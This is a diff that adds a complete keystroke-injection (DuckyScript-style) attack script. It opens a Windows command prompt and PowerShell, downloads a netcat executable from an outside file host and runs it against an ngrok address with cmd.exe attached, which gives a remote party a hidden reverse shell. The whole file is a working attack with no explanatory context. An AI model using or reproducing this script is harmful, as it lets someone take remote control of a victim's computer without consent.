@@ -1,0 +1,27 @@
+DELAY 1000
+GUI r
+DELAY 1000 	
+
+STRING cmd
+ENTER
+DELAY 5300
+
+STRING powershell
+DELAY 500 	
+ENTER
+
+STRING cd C:\Users\Public\Desktop
+ENTER
+DELAY 500
+
+STRING $URL="https://up10.me/H/nc64.exe"
+ENTER
+STRING $Path="C:\Users\Public\Desktop\nc64.exe"
+ENTER
+DELAY 1000
+
+STRING Invoke-Webrequest -URI $URL -OutFile $Path
+ENTER
+DELAY 500
+STRING .\nc64.exe 0.tcp.eu.ngrok.io 14400 -e cmd.exe -d
+ENTER
